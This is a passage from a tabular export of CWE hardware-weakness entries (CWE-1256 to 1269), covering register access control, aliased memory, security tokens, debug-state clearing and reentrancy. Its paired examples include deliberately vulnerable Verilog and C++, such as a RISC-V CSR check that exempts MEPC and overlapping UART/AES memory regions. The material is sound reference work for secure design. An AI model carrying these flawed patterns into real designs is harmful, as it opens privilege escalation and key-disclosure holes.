pipo(clk,rst,a,q);input clk,rst;input[3:0]a;output[3:0]q;reg[3:0]q;always@(posedge clk,posedge rst)beginif (rst==1'b1)q<4'b0000;elseq<a;endendmodule","Phase:  Architecture and DesignThe design phase must consider each check of a security token against a standard and the amount of power consumed during the check of a good token versus a bad token. The alternative is an all at once check where a retry counter is incremented PRIOR to the check.Phase:  Architecture and DesignAnother potential mitigation is to parallelize shifting of secret data (see example 2 below). Note that the wider the bus the more effective the result.Phase:  Architecture and DesignAn additional potential mitigation is to add random data to each crypto operation then subtract it out afterwards. This is highly effective but costly in performance, area, and power consumption. It also requires a random number generator.Phase:  ImplementationIf the architecture is unable to prevent the attack, using filtering components may reduce the ability to implement an attack, however, consideration must be given to the physical removal of the filter elements.Phase:  IntegrationDuring integration, avoid use of a single secret for an extended period (e.g. frequent key updates). This limits the amount of data compromised but at the cost of complexity of use."
CWE-1256: Improper Restriction of Software Interfaces to Hardware Features,"The product provides software-controllable device functionality for capabilities such as power and clock management, but it does not properly limit functionality that can lead to modification of hardware memory or register bits, or the ability to observe physical side channels.","Scope: Integrity, Impact: Technical Impact:Modify Memory; Modify Application Data; Bypass Protection Mechanism, Likelihood: ","Example 1This example considers the Rowhammer problem [REF-1083]. The Rowhammer issue was caused by a program in a tight loop writing repeatedly to a location to which the program was allowed to write but causing an adjacent memory location value to change.(bad code)Example Language:OtherContinuously writing the same value to the same address causes the value of an adjacent location to change value.Preventing the loop required to defeat the Rowhammer exploit is not always possible:(good code)Example Language:OtherRedesign the RAM devices to reduce inter capacitive coupling making the Rowhammer exploit impossible.While the redesign may be possible for new devices, a redesign is not possible in existing devices. There is also the possibility that reducing capacitance with a relayout would impact the density of the device resulting in a less capable, more costly device.Example 2Suppose a hardware design implements a set of software-accessible registers for scaling clock frequency and voltage but does not control access to these registers. Attackers may cause register and memory changes and race conditions by changing the clock or voltage of the device under their control.Example 3Consider the following SoC
	      design. Security-critical settings for scaling clock
	      frequency and voltage are available in a range of
	      registers bounded by [PRIV_END_ADDR : PRIV_START_ADDR]
	      in the tmcu.csr module in the HW Root of Trust. These
	      values are writable based on the lock_bit register in
	      the same module. The lock_bit is only writable by
	      privileged software running on the tmcu.We assume that untrusted software running on any of the
	      Core{0-N} processors has access to the input and output
	      ports of the hrot_iface. If untrusted software can clear
	      the lock_bit or write the clock frequency and voltage
	      registers due to inadequate protection, a fault
	      injection attack could be performed.",Phases:  Architecture and Design; ImplementationEnsure proper access control mechanisms protect software-controllable features altering physical operating conditions such as clock frequency and voltage.
CWE-1257: Improper Access Control Applied to Mirrored or Aliased Memory Regions,Aliased or mirrored memory regions in hardware designs may have inconsistent read/write permissions enforced by the hardware. A possible result is that an untrusted agent is blocked from accessing a memory region but is not blocked from accessing the corresponding aliased memory region.,"Scope: Confidentiality, Impact: Technical Impact:Read Memory, Likelihood: High; Scope: Integrity, Impact: Technical Impact:Modify Memory, Likelihood: High; Scope: Availability, Impact: Technical Impact:DoS: Instability, Likelihood: High","Example 1In a System-on-a-Chip (SoC) design the system fabric uses 16 bit addresses. An IP unit (Unit_A) has 4 kilobyte of internal memory which is mapped into a 16 kilobyte address range in the system fabric address map.System AddressMapped to0x0000 - 0x3FFFUnit_A  registers : 0x0000 - 0x0FFF0x4000 - 0xFFFFOther IPs & MemoryTo protect the register controls in Unit_A unprivileged software is blocked from accessing addresses between 0x0000 - 0x0FFF.The address decoder of Unit_A masks off the higher order address bits and decodes only the lower 12 bits for computing the offset into the 4 kilobyte internal memory space.(bad code)Example Language:OtherIn this design  the aliased memory address ranges are these:0x0000 - 0x0FFF0x1000 - 0x1FFF0x2000 - 0x2FFF0x3000 - 0x3FFFThe same register can be accessed using four different addresses: 0x0000, 0x1000, 0x2000, 0x3000.The system address filter only blocks access to range 0x0000 - 0x0FFF and does not block access to the aliased addresses in 0x1000 - 0x3FFF range. Thus, untrusted software can leverage the aliased memory addresses to bypass the memory protection.(good code)Example Language:OtherIn this design the aliased memory addresses (0x1000 - 0x3FFF) could be blocked from all system software access since they are not used by software.Alternately, the MPU logic can be changed to apply the memory protection policies to the full address range mapped to Unit_A (0x0000 - 0x3FFF).","Phases:  Architecture and Design; ImplementationThe checks should be applied for consistency access rights between primary memory regions and any mirrored or aliased memory regions. If different memory protection units (MPU) are protecting the aliased regions, their protected range definitions and policies should be synchronized.Phases:  Architecture and Design; ImplementationThe controls that allow enabling memory aliases or changing the size of mapped memory regions should only be programmable by trusted software components."
CWE-1258: Exposure of Sensitive System Information Due to Uncleared Debug Information,"The hardware does not fully clear security-sensitive values, such as keys and intermediate values in cryptographic operations, when debug mode is entered.","Scope: Confidentiality, Impact: Technical Impact:Read Memory, Likelihood: ; Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ","Example 1A cryptographic core in a System-On-a-Chip (SoC) is used for cryptographic acceleration and implements several cryptographic operations (e.g., computation of AES encryption and decryption, SHA-256, HMAC, etc.). The keys for these operations or the intermediate values are stored in registers internal to the cryptographic core. These internal registers are in the Memory Mapped Input Output (MMIO) space and are blocked from access by software and other untrusted agents on the SoC. These registers are accessible through the debug and test interface.(bad code)Example Language:OtherIn the above scenario, registers that store keys and intermediate values of cryptographic operations are not cleared when system enters debug mode. An untrusted actor running a debugger may read the contents of these registers and gain access to secret keys and other sensitive cryptographic information.(good code)Example Language:OtherWhenever the chip enters debug mode, all registers containing security-sensitive data are be cleared rendering them unreadable.","Phase:  Architecture and DesignWhenever debug mode is enabled, all registers containing sensitive assets must be cleared."
CWE-1259: Improper Restriction of Security Token Assignment,"The System-On-A-Chip (SoC) implements a Security Token mechanism to differentiate what actions are allowed or disallowed when a transaction originates from an entity. However, the Security Tokens are improperly protected.","Scope: ConfidentialityIntegrityAvailabilityAccess Control, Impact: Technical Impact:Modify Files or Directories; Execute Unauthorized Code or Commands; Bypass Protection Mechanism; Gain Privileges or Assume Identity; Modify Memory; Modify Memory; DoS: Crash, Exit, or Restart, Likelihood: High","Example 1For example, consider a system with a register for storing an AES key for encryption and decryption. The key is of 128 bits implemented as a set of four 32-bit registers. The key register assets have an associated control register, AES_KEY_ACCESS_POLICY, which provides the necessary access controls. This access-policy register defines which agents may engage in a transaction, and the type of transaction, with the AES-key registers. Each bit in this 32-bit register defines a security Token. There could be a maximum of 32 security Tokens that are allowed access to the AES-key registers. The number of the bit when set (i.e., ""1"") allows respective action from an agent whose identity matches the number of the bit and, if ""0"" (i.e., Clear), disallows the respective action to that corresponding agent.Let's assume the system has two agents: a Main-controller and an Aux-controller. The respective Security Tokens are ""1"" and ""2"".RegisterDescriptionDefaultAES_ENC_DEC_KEY_0AES key [0:31] for encryption or decryption0x00000000AES_ENC_DEC_KEY_1AES key [32:63] for encryption or decryption0x00000000AES_ENC_DEC_KEY_2AES key [64:95] for encryption or decryption0x00000000AES_ENC_DEC_KEY_3AES key [96:127] for encryption or decryption0x00000000AES_KEY_ACCESS_POLICYAES key access register [31:0]0x00000002An agent with Security Token ""1"" has access to AES_ENC_DEC_KEY_0 through AES_ENC_DEC_KEY_3 registers. As per the above access policy, the AES-Key-access policy allows access to the AES-key registers if the security Token is ""1"".(bad code)Example Language:OtherThe Aux-controller could program its Security Token to ""1"" from ""2"".The SoC does not properly protect the Security Token of the agents, and, hence, the Aux-controller in the above example can spoof the transaction (i.e., send the transaction as if it is coming from the Main-controller to access the AES-Key registers)(good code)Example Language:OtherThe SoC needs to protect the Security Tokens. None of the agents in the SoC should have the ability to change the Security Token.",Phases:  Architecture and Design; ImplementationSecurity Token assignment review checks for design inconsistency and common weaknesses.Security-Token definition and programming flow is tested in both pre-silicon and post-silicon testing.
CWE-1260: Improper Handling of Overlap Between Protected Memory Ranges,"The product allows address regions to overlap, which can result in the bypassing of intended memory protection.","Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Modify Memory; Read Memory; DoS: Instability, Likelihood: High","Example 1For example, consider a design with a 16-bit address that has two software privilege levels: Privileged_SW and Non_privileged_SW. To isolate the system memory regions accessible by these two privilege levels, the design supports three memory regions: Region_0, Region_1, and Region_2.Each region is defined by two 32 bit registers: its range and its access policy.Address_range[15:0]: specifies the Base address of the regionAddress_range[31:16]: specifies the size of the regionAccess_policy[31:0]: specifies what types of software can access a region and which actions are allowedCertain bits of the access policy are defined symbolically as follows:Access_policy.read_np: if set to one, allows reads from Non_privileged_SWAccess_policy.write_np: if set to one, allows writes from Non_privileged_SWAccess_policy.execute_np: if set to one, allows code execution by Non_privileged_SWAccess_policy.read_p: if set to one, allows reads from Privileged_SWAccess_policy.write_p: if set to one, allows writes from Privileged_SWAccess_policy.execute_p: if set to one, allows code execution by Privileged_SWFor any requests from software, an address-protection filter checks the address range and access policies for each of the three regions, and only allows software access if all three filters allow access.Consider the following goals for access control as intended by the designer:Region_0 & Region_1: registers are programmable by Privileged_SWRegion_2: registers are programmable by Non_privileged_SWThe intention is that Non_privileged_SW cannot modify memory region and policies defined by Privileged_SW in Region_0 and Region_1. Thus, it cannot read or write the memory regions that Privileged_SW is using.(bad code)Non_privileged_SW can program the Address_range register for Region_2 so that its address overlaps with the ranges defined by Region_0 or Region_1. Using this capability, it is possible for Non_privileged_SW to block any memory region from being accessed by Privileged_SW, i.e., Region_0 and Region_1.This design could be improved in several ways.(good code)Ensure that software accesses to memory regions are only permitted if all three filters permit access. Additionally, the scheme could define a memory region priority to ensure that Region_2 (the memory region defined by Non_privileged_SW) cannot overlap Region_0 or Region_1 (which are used by Privileged_SW).Example 2The example code below is taken from the IOMMU controller module of the HACK@DAC'19 buggy CVA6 SoC [REF-1338]. The static memory map is composed of a set of Memory-Mapped Input/Output (MMIO) regions covering different IP agents within the SoC. Each region is defined by two 64-bit variables representing the base address and size of the memory region (XXXBase and XXXLength).In this example, we have 12 IP agents, and only 4 of them are called out for illustration purposes in the code snippets. Access to the AES IP MMIO region is considered privileged as it provides access to AES secret key, internal states, or decrypted data.(bad code)Example Language:Verilog...localparam logic[63:0] PLICLength = 64'h03FF_FFFF;localparam logic[63:0] UARTLength = 64'h0011_1000;localparam logic[63:0] AESLength = 64'h0000_1000;localparam logic[63:0] SPILength = 64'h0080_0000;...typedef enum logic [63:0] {...PLICBase = 64'h0C00_0000,UARTBase = 64'h1000_0000,AESBase = 64'h1010_0000,SPIBase = 64'h2000_0000,...The vulnerable code allows the overlap between the protected MMIO region of the AES peripheral and the unprotected UART MMIO region. As a result, unprivileged users can access the protected region of the AES IP. In the given vulnerable example UART MMIO region starts at address 64'h1000_0000 and ends at address 64'h1011_1000 (UARTBase is 64'h1000_0000, and the size of the region is provided by the UARTLength of 64'h0011_1000).On the other hand, the AES MMIO region starts at address 64'h1010_0000 and ends at address 64'h1010_1000, which implies an overlap between the two peripherals' memory regions. Thus, any user with access to the UART can read or write the AES MMIO region, e.g., the AES secret key.To mitigate this issue, remove the overlapping address regions by decreasing the size of the UART memory region or adjusting memory bases for all the remaining peripherals. [REF-1339](good code)Example Language:Verilog...localparam logic[63:0] PLICLength = 64'h03FF_FFFF;localparam logic[63:0] UARTLength = 64'h0000_1000;localparam logic[63:0] AESLength = 64'h0000_1000;localparam logic[63:0] SPILength = 64'h0080_0000;...typedef enum logic [63:0] {...PLICBase = 64'h0C00_0000,UARTBase = 64'h1000_0000,AESBase = 64'h1010_0000,SPIBase = 64'h2000_0000,...","Phase:  Architecture and DesignEnsure that memory regions are isolated as intended and that access control (read/write) policies are used by hardware to protect privileged software.Phase:  ImplementationFor all of the programmable memory protection regions, the memory protection unit (MPU) design can define a priority scheme.For example: if three memory regions can be programmed (Region_0, Region_1, and Region_2), the design can enforce a priority scheme, such that, if a system address is within multiple regions, then the region with the lowest ID takes priority and the access-control policy of that region will be applied. In some MPU designs, the priority scheme can also be programmed by trusted software.Hardware logic or trusted firmware can also check for region definitions and block programming of memory regions with overlapping addresses.The memory-access-control-check filter can also be designed to apply a policy filter to all of the overlapping ranges, i.e., if an address is within Region_0 and Region_1, then access to this address is only granted if both Region_0 and Region_1 policies allow the access.Effectiveness: High"
CWE-1261: Improper Handling of Single Event Upsets,The hardware logic does not effectively handle when single-event upsets (SEUs) occur.,"Scope: AvailabilityAccess Control, Impact: Technical Impact:DoS: Crash, Exit, or Restart; DoS: Instability; Gain Privileges or Assume Identity; Bypass Protection Mechanism, Likelihood: ","Example 1This is an example from [REF-1089]. See the reference for full details of this issue.Parity is error detecting but not error correcting.(bad code)Example Language:OtherDue to single-event upsets, bits are flipped in memories.  As a result, memory-parity checks fail, which results in restart and a temporary denial of service of two to three minutes.(good code)Example Language:OtherUsing error-correcting codes could have avoided the restart caused by SEUs.Example 2In 2016, a security researcher, who was also a patient using a pacemaker, was on an airplane when a bit flip occurred in the pacemaker, likely due to the higher prevalence of cosmic radiation at such heights. The pacemaker was designed to account for bit flips and went into a default safe mode, which still forced the patient to go to a hospital to get it reset. The bit flip also inadvertently enabled the researcher to access the crash file, perform reverse engineering, and detect a hard-coded key. [REF-1101]","Phase:  Architecture and DesignImplement triple-modular redundancy around security-sensitive modules.Phase:  Architecture and DesignSEUs mostly affect SRAMs. For SRAMs storing security-critical data, implement Error-Correcting-Codes (ECC) and Address Interleaving."
CWE-1262: Improper Access Control for Register Interface,"The product uses memory-mapped I/O registers that act as an interface to hardware functionality from software, but there is improper access control to those registers.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Memory; Read Application Data; Modify Memory; Modify Application Data; Gain Privileges or Assume Identity; Bypass Protection Mechanism; Unexpected State; Alter Execution LogicConfidentiality of hardware assets may be violated if the protected information can be read out by software through the register interface. Registers storing security state, settings, other security-critical data may be corruptible by software without correctly implemented protections., Likelihood: ","Example 1The register interface provides software access to hardware functionality. This functionality is an attack surface. This attack surface may be used to run untrusted code on the system through the register interface. As an example, cryptographic accelerators require a mechanism for software to select modes of operation and to provide plaintext or ciphertext data to be encrypted or decrypted as well as other functions. This functionality is commonly provided through registers.(bad code)Cryptographic key material stored in registers inside the cryptographic accelerator can be accessed by software.(good code)Key material stored in registers should never be accessible to software. Even if software can provide a key, all read-back paths to software should be disabled.Example 2The example code is taken from the Control/Status Register (CSR) module inside the processor core of the HACK@DAC'19 buggy CVA6 SoC [REF-1340]. In RISC-V ISA [REF-1341], the CSR file contains different sets of registers with different privilege levels, e.g., user mode (U), supervisor mode (S), hypervisor mode (H), machine mode (M), and debug mode (D), with different read-write policies, read-only (RO) and read-write (RW). For example, machine mode, which is the highest privilege mode in a RISC-V system, registers should not be accessible in user, supervisor, or hypervisor modes.(bad code)Example Language:Verilogif (csr_we || csr_read) beginif ((riscv::priv_lvl_t'(priv_lvl_o & csr_addr.csr_decode.priv_lvl) != csr_addr.csr_decode.priv_lvl) && !(csr_addr.address==riscv::CSR_MEPC)) begincsr_exception_o.cause = riscv::ILLEGAL_INSTR;csr_exception_o.valid = 1'b1;end// check access to debug mode only CSRsif (csr_addr_i[11:4] == 8'h7b && !debug_mode_q) begincsr_exception_o.cause = riscv::ILLEGAL_INSTR;csr_exception_o.valid = 1'b1;endendThe vulnerable example code allows the machine exception program counter (MEPC) register to be accessed from a user mode program by excluding the MEPC from the access control check. MEPC as per the RISC-V specification can be only written or read by machine mode code. Thus, the attacker in the user mode can run code in machine mode privilege (privilege escalation).To mitigate the issue, fix the privilege check so that it throws an Illegal Instruction Exception for user mode accesses to the MEPC register. [REF-1345](good code)Example Language:Verilogif (csr_we || csr_read) beginif ((riscv::priv_lvl_t'(priv_lvl_o & csr_addr.csr_decode.priv_lvl) != csr_addr.csr_decode.priv_lvl)) begincsr_exception_o.cause = riscv::ILLEGAL_INSTR;csr_exception_o.valid = 1'b1;end// check access to debug mode only CSRsif (csr_addr_i[11:4] == 8'h7b && !debug_mode_q) begincsr_exception_o.cause = riscv::ILLEGAL_INSTR;csr_exception_o.valid = 1'b1;endend",Phase:  Architecture and DesignDesign proper policies for hardware register access from software.Phase:  ImplementationEnsure that access control policies for register access are implemented in accordance with the specified design.
CWE-1263: Improper Physical Access Control,"The product is designed with access restricted to certain information, but it does not sufficiently protect against an unauthorized actor with physical access to these areas.","Scope: ConfidentialityIntegrityAccess Control, Impact: Technical Impact:Varies by Context, Likelihood: ",无示范例子,Phase:  Architecture and DesignSpecific protection requirements depend strongly on contextual factors including the level of acceptable risk associated with compromise to the product's protection mechanism. Designers could incorporate anti-tampering measures that protect against or detect when the product has been tampered with.Phase:  TestingThe testing phase of the lifecycle should establish a method for determining whether the protection mechanism is sufficient to prevent unauthorized access.Phase:  ManufacturingEnsure that all protection mechanisms are fully activated at the time of manufacturing and distribution.
CWE-1264: Hardware Logic with Insecure De-Synchronization between Control and Data Channels,The hardware logic for error handling and security checks can incorrectly forward data before the security check is complete.,"Scope: Confidentiality, Impact: Technical Impact:Read Memory; Read Application Data, Likelihood: ","Example 1There are several standard on-chip bus protocols used in modern SoCs to allow communication between components. There are a wide variety of commercially available hardware IP implementing the interconnect logic for these protocols. A bus connects components which initiate/request communications such as processors and DMA controllers (bus masters) with peripherals which respond to requests. In a typical system, the privilege level or security designation of the bus master along with the intended functionality of each peripheral determine the security policy specifying which specific bus masters can access specific peripherals.  This security policy (commonly referred to as a bus firewall) can be enforced using separate IP/logic from the actual interconnect responsible for the data routing.(bad code)Example Language:OtherThe firewall and data routing logic becomes de-synchronized due to a hardware logic bug allowing components that should not be allowed to communicate to share data. For example, consider an SoC with two processors. One is being used as a root of trust and can access a cryptographic key storage peripheral. The other processor (application cpu) may run potentially untrusted code and should not access the key store. If the application cpu can issue a read request to the key store which is not blocked due to de-synchronization of data routing and the bus firewall, disclosure of cryptographic keys is possible.(good code)Example Language:OtherAll data is correctly buffered inside the interconnect until the firewall has determined that the endpoint is allowed to receive the data.",Phase:  Architecture and DesignThoroughly verify the data routing logic to ensure that any error handling or security checks effectively block illegal dataflows.
CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls,"During execution of non-reentrant code, the product performs a call that unintentionally produces a nested invocation of the non-reentrant code.","Scope: Integrity, Impact: Technical Impact:Unexpected StateExploitation of this weakness can leave the application in an unexpected state and cause variables to be reassigned before the first invocation has completed. This may eventually result in memory corruption or unexpected code execution., Likelihood: Unknown","Example 1The implementation of the Widget class in the following C++ code is an example of code that is not designed to be reentrant. If an invocation of a method of Widget inadvertently produces a second nested invocation of a method of Widget, then data member backgroundImage may unexpectedly change during execution of the outer call.(bad code)Example Language:C++class Widget{private:Image* backgroundImage;public:void click(){if (backgroundImage){backgroundImage->click();}}void changeBackgroundImage(Image* newImage){if (backgroundImage){delete backgroundImage;}backgroundImage = newImage;}}class Image{public:void click(){scriptEngine->fireOnImageClick();/* perform some operations using ""this"" pointer */}}Looking closer at this example, Widget::click() calls backgroundImage->click(), which in turn calls scriptEngine->fireOnImageClick(). The code within fireOnImageClick() invokes the appropriate script handler routine as defined by the document being rendered. In this scenario this script routine is supplied by an adversary and this malicious script makes a call to Widget::changeBackgroundImage(), deleting the Image object pointed to by backgroundImage. When control returns to Image::click, the function's backgroundImage ""this"" pointer (which is the former value of backgroundImage) is a dangling pointer. The root of this weakness is that while one operation on Widget (click) is in the midst of executing, a second operation on the Widget object may be invoked (in this case, the second invocation is a call to different method, namely changeBackgroundImage) that modifies the non-local variable.Example 2This is another example of C++ code that is not designed to be reentrant.(bad code)Example Language:C++class Request{private:std::string uri;/* ... */public:void setup(ScriptObject* _uri){this->uri = scriptEngine->coerceToString(_uri);/* ... */}void send(ScriptObject* _data){Credentials credentials = GetCredentials(uri);std::string data = scriptEngine->coerceToString(_data);doSend(uri, credentials, data);}}The expected order of operations is a call to Request::setup(), followed by a call to Request::send(). Request::send() calls scriptEngine->coerceToString(_data) to coerce a script-provided parameter into a string. This operation may produce script execution. For example, if the script language is ECMAScript, arbitrary script execution may result if _data is an adversary-supplied ECMAScript object having a custom toString method. If the adversary's script makes a new call to Request::setup, then when control returns to Request::send, the field uri and the local variable credentials will no longer be consistent with one another. As a result, credentials for one resource will be shared improperly with a different resource. The root of this weakness is that while one operation on Request (send) is in the midst of executing, a second operation may be invoked (setup).","Phase:  Architecture and DesignWhen architecting a system that will execute untrusted code in response to events, consider executing the untrusted event handlers asynchronously (asynchronous message passing) as opposed to executing them synchronously at the time each event fires. The untrusted code should execute at the start of the next iteration of the thread's message loop. In this way, calls into non-reentrant code are strictly serialized, so that each operation completes fully before the next operation begins. Special attention must be paid to all places where type coercion may result in script execution. Performing all needed coercions at the very beginning of an operation can help reduce the chance of operations executing at unexpected junctures.Effectiveness: HighPhase:  ImplementationMake sure the code (e.g., function or class) in question is reentrant by not leveraging non-local data, not modifying its own code, and not calling other non-reentrant code.Effectiveness: High"
CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device,"The product does not properly provide a capability for the product administrator to remove sensitive data at the time the product is decommissioned. A scrubbing capability could be missing, insufficient, or incorrect.","Scope: Confidentiality, Impact: Technical Impact:Read Memory, Likelihood: ",无示范例子,"Phase:  Architecture and DesignFunctionality to completely scrub data from a product at the conclusion of its lifecycle should be part of the design phase. Trying to add this function on top of an existing architecture could lead to incomplete removal of sensitive information/data.Phase:  PolicyThe manufacturer should describe the location(s) where sensitive data is stored and the policies and procedures for its removal. This information may be conveyed, for example, in an Administrators Guide or a Statement of Volatility.Phase:  ImplementationIf the capability to wipe sensitive data isn't built-in, the manufacturer may need to provide a utility to scrub sensitive data from storage if that data is located in a place which is non-accessible by the administrator. One example of this could be when sensitive data is stored on an EEPROM for which there is no user/admin interface provided by the system."
CWE-1267: Policy Uses Obsolete Encoding,The product uses an obsolete encoding mechanism to implement access controls.,"Scope: ConfidentialityIntegrityAvailabilityAccess Control, Impact: Technical Impact:Modify Memory; Read Memory; Modify Files or Directories; Read Files or Directories; DoS: Resource Consumption (Other); Execute Unauthorized Code or Commands; Gain Privileges or Assume Identity; Bypass Protection Mechanism; Reduce Reliability, Likelihood: High","Example 1For example, consider a system that has four bus masters. The table below provides bus masters, their Security Tokens, and trust assumptions.Bus MasterSecurity Token DecodingTrust AssumptionsMaster_0""00""UntrustedMaster_1""01""TrustedMaster_2""10""UntrustedMaster_3""11""UntrustedThe policy encoding is to be defined such that Security Token will be used in implemented access-controls. The bits in the bus transaction that contain Security-Token information are Bus_transaction [15:11]. The assets are the AES-Key registers for encryption or decryption. The key of 128 bits is implemented as a set of four, 32-bit registers.RegisterField descriptionAES_ENC_DEC_KEY_0AES key [0:31] for encryption or decryption, Default 0x00000000AES_ENC_DEC_KEY_1AES key [32:63] for encryption or decryption, Default 0x00000000AES_ENC_DEC_KEY_2AES key [64:95] for encryption or decryption, Default 0x00000000AES_ENC_DEC_KEY_4AES key [96:127] for encryption or decryption, Default 0x00000000Below is an example of a policy encoding scheme inherited from a previous project where all ""ODD"" numbered Security Tokens are trusted.(bad code)If (Bus_transaction[14] == ""1"")Trusted = ""1""ElseTrusted = ""0""If (trusted)Allow access to AES-Key registersElseDeny access to AES-Key registersThe inherited policy encoding is obsolete and does not work for the new system where an untrusted bus master with an odd Security Token exists in the system, i.e., Master_3 whose Security Token is ""11"". Based on the old policy, the untrusted bus master (Master_3) has access to the AES-Key registers. To resolve this, a register AES_KEY_ACCESS_POLICY can be defined to provide necessary, access controls:New Policy:AES_KEY_ACCESS_POLICY[31:0] Default 0x00000002 - agent with Security Token ""1"" has access to AES_ENC_DEC_KEY_0 through AES_ENC_DEC_KEY_4 registersThe AES_KEY_ACCESS_POLICY register defines which agents with a Security Token in the transaction can access the AES-key registers. Each bit in this 32-bit register defines a Security Token. There could be a maximum of 32 security Tokens that are allowed access to the AES-key registers. The number of the bit when set (i.e., ""1"") allows respective action from an agent whose identity matches the number of the bit and, if ""0"" (i.e., Clear), disallows the respective action to that corresponding agent. Thus, any bus master with Security Token ""01"" is allowed access to the AES-Key registers. Below is the Pseudo Code for policy encoding:(good code)Security_Token[4:0] = Bus_transaction[15:11]If (AES_KEY_ACCESS_POLICY[Security_Token] == ""1"")Allow access to AES-Key registersElseDeny access to AES-Key registers",Phases:  Architecture and Design; ImplementationSecurity Token Decoders should be reviewed for design inconsistency and common weaknesses.Access and programming flows should be tested in both pre-silicon and post-silicon testing.Effectiveness: High
CWE-1268: Policy Privileges are not Assigned Consistently Between Control and Data Agents,The product's hardware-enforced access control for a particular resource improperly accounts for privilege discrepancies between control and write policies.,"Scope: ConfidentialityIntegrityAvailabilityAccess Control, Impact: Technical Impact:Modify Memory; Read Memory; DoS: Crash, Exit, or Restart; Execute Unauthorized Code or Commands; Gain Privileges or Assume Identity; Bypass Protection Mechanism; Read Files or Directories; Reduce Reliability, Likelihood: High","Example 1Consider a system of seven registers for storing and configuring an AES key for encryption or decryption.Four 32-bit registers are used to store a 128-bit AES key. The names of those registers are AES_ENC_DEC_KEY_0, AES_ENC_DEC_KEY_1, AES_ENC_DEC_KEY_2, and AES_ENC_DEC_KEY_3. Collectively these are referred to as the AES Key registers.RegisterField descriptionAES_ENC_DEC_KEY_0AES key [0:31] for encryption or decryptionDefault 0x00000000AES_ENC_DEC_KEY_1AES key [32:63] for encryption or decryptionDefault 0x00000000AES_ENC_DEC_KEY_2AES key [64:95] for encryption or decryptionDefault 0x00000000AES_ENC_DEC_KEY_3AES key [96:127] for encryption or decryptionDefault 0x00000000Three 32-bit registers are used to define access control for the AES-key registers. The names of those registers are AES_KEY_CONTROL_POLICY, AES_KEY_READ_POLICY, and AES_KEY_WRITE_POLICY. Collectively these registers are referred to as the Policy registers, and their functions are explained next.The AES_KEY_CONTROL_POLICY register defines which agents can write to the AES_KEY_READ_POLICY or AES_KEY_WRITE_POLICY registers.The AES_KEY_READ_POLICY register defines which agents can read the AES-key registers.The AES_KEY_WRITE_POLICY register defines which agents can write the AES key registers.The preceding three policy registers encode access control at the bit level. Therefore a maximum of 32 agents can be defined (1 bit per agent). The value of the bit when set (i.e., ""1"") allows the respective action from an agent whose identity corresponds to the number of the bit. If clear (i.e., ""0""), it disallows the respective action to that corresponding agent. For example, if bit 0 is set to ""1"" in the AES_KEY_READ_POLICY register, then agent 0 has permission to read the AES-key registers.Consider that there are 4 agents named Agent 1, Agent 2, Agent 3, and Agent 4. For access control purposes Agent 1 is assigned to bit 1, Agent 2 to bit 2, Agent 3 to bit 3, and Agent 4 to bit 4. All agents are trusted except for Agent 3 who is untrusted. Also consider the register values in the below table.(bad code)RegisterField descriptionAES_KEY_CONTROL_POLICYControls which agents can write to READ_POLICY and WRITE_POLICY registers[31:0] Default 0x00000018AES_KEY_READ_POLICYControls which agents can read the AES-key registers[31:0] Default 0x00000002AES_KEY_WRITE_POLICYControls which agents can write to the AES-key registers[31:0] Default 0x00000004IThe AES_KEY_CONTROL_POLICY register value is 0x00000018. In binary, the lower 8 bits will be 0001 1000, meaning that:Bits 3 and 4 are set, thus Agents 3 and 4 will have write access to AES_KEY_READ_POLICY or AES_KEY_WRITE_POLICY.All other bits are clear, hence agents other than 3 and 4 will not have access to write to AES_KEY_READ_POLICY or AES_KEY_WRITE_POLICY.The AES_KEY_READ_POLICY register value is 0x00000002. In binary, the lower 8 bits will be 0000 0010, meaning that:Bit 1 is set, thus Agent 1 will be able to read the AES key registers.The AES_KEY_WRITE_POLICY register value is 0x00000004. In binary, the lower 8 bits will be 0000 0100, meaning that:Bit 2 is set, thus Agent 2 will be able to write the AES Key registers.The configured access control policy for Agents 1,2,3,4 is summarized in table below.AgentReadWriteControlAgent 1AllowedNot AllowedNot AllowedAgent 2Not AllowedAllowedNot AllowedAgent 3Not AllowedNot AllowedAllowedAgent 4Not AllowedNot AllowedAllowedAt this point Agents 3 and 4 can only configure which agents can read AES keys and which agents can write AES keys. Agents 3 and 4 cannot read or write AES keys - just configure access control.Now, recall Agent 3 is untrusted. As explained above, the value of the AES_KEY_CONTROL_POLICY register gives agent 3 access to write to the AES_KEY_WRITE_POLICY register. Agent 3 can use this write access to add themselves to the AES_KEY_WRITE_POLICY register. This is accomplished by Agent 3 writing the value 0x00000006. In binary, the lower 8 bits are 0000 0110, meaning that bit 3 will be set. Thus, giving Agent 3 having the ability to write to the AES Key registers.If the AES_KEY_CONTROL_POLICY register value is 0x00000010, the lower 8 bits will be 0001 0000. This will give Agent 4, a trusted agent, write access to AES_KEY_WRITE_POLICY, but Agent 3, who is untrusted, will not have write access. The Policy register values should therefore be as follows:(good code)RegisterField descriptionAES_KEY_CONTROL_POLICY[31:0] Default 0x00000010AES_KEY_READ_POLICY[31:0] Default 0x00000002AES_KEY_WRITE_POLICY[31:0] Default 0x00000004",Phases:  Architecture and Design; ImplementationAccess-control-policy definition and programming flow must be sufficiently tested in pre-silicon and post-silicon testing.
CWE-1269: Product Released in Non-Release Configuration,The product released to market is released in pre-production or manufacturing configuration.,"Scope: ConfidentialityIntegrityAvailabilityAccess ControlAccountabilityAuthenticationAuthorizationNon-Repudiation, Impact: Technical Impact:Other, Likelihood: High","Example 1This example shows what happens when a preproduction system is made available for production.(bad code)Suppose the chipmaker has a way of scanning all the internal memory (containing chipmaker-level secrets) during the manufacturing phase, and the way the chipmaker or the Original Equipment Manufacturer (OEM) marks the end of the manufacturing phase is by blowing a Manufacturing Complete fuse. Now, suppose that whoever blows the Manufacturing Complete fuse inadvertently forgets to execute the step to blow the fuse.An attacker will now be able to scan all the internal memory (containing chipmaker-level secrets).(good code)Blow the Manufacturing Complete fuse.","Phase:  ImplementationEnsure that there exists a marker for denoting the Manufacturing Complete stage and that the Manufacturing Complete marker gets updated at the Manufacturing Complete stage (i.e., the Manufacturing Complete fuse gets blown).Phase:  IntegrationEnsure that there exists a marker for denoting the Manufacturing Complete stage and that the Manufacturing Complete marker gets updated at the Manufacturing Complete stage (i.e., the Manufacturing Complete fuse gets blown).Phase:  ManufacturingEnsure that there exists a marker for denoting the Manufacturing Complete stage and that the Manufacturing Complete marker gets updated at the Manufacturing Complete 